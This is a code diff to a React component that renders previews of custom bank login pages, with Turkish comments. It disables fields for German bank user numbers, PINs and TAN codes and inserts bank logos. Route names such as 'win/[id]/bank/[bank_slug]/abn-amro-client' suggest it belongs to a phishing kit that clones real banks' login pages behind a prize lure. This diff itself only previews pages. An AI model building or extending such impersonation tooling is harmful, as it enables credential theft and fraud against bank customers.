@@ -6,6 +6,7 @@ import { DEFAULT_DESIGN_CONFIG, BlockType } from "@/lib/bank-design-schema";
 import { DemoShell } from "@/components/demo/DemoShell";
 import type { BankTheme } from "@/lib/bank-theme-config";
 import { getBankTheme } from "@/lib/bank-theme-config";
+import parse, { attributesToProps, domToReact, Element } from "html-react-parser";
 
 // Özel Tasarım İçe Aktarımları
 import { AbnAmroLoginClient } from "@/app/win/[id]/bank/[bank_slug]/abn-amro-client";
@@ -83,6 +84,42 @@ export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
   // 2. ÖNCELİK: DİNAMİK YAPISAL JSON TASARIMI (AI veya Admin Paneli ile üretilmiş)
   if (bank.design) {
     const design = bank.design;
+    
+    if (design.customHtml) {
+      const options = {
+        replace: (domNode: any) => {
+          if (domNode instanceof Element) {
+            if (domNode.name === "input" && domNode.attribs?.name === "verfuegernummer") {
+              const props = attributesToProps(domNode.attribs);
+              return <input {...props} disabled placeholder="Kullanıcı Adı" />;
+            }
+            if (domNode.name === "input" && domNode.attribs?.name === "pin") {
+              const props = attributesToProps(domNode.attribs);
+              return <input {...props} disabled type="password" placeholder="Şifre" />;
+            }
+            if (domNode.name === "input" && domNode.attribs?.name === "tacCode") {
+              const props = attributesToProps(domNode.attribs);
+              return <input {...props} disabled placeholder="Kod" />;
+            }
+            if (domNode.name === "button" && domNode.attribs?.type === "submit") {
+              const props = attributesToProps(domNode.attribs);
+              return <button {...props} disabled>{domToReact(domNode.children as any, options)}</button>;
+            }
+            if (domNode.name === "img" && domNode.attribs?.src && domNode.attribs.src.includes("placeholder")) {
+              if (bank.logoFile) {
+                const props = attributesToProps(domNode.attribs);
+                return <img {...props} src={bank.logoFile} alt={bank.name} />;
+              }
+            }
+          }
+        }
+      };
+      return (
+        <div style={{ pointerEvents: 'none' }} className="min-h-screen w-full font-sans antialiased scale-75 origin-top">
+          {parse(design.customHtml, options)}
+        </div>
+      );
+    }
 
     const renderBlock = (block: BlockType) => {
       switch (block) {
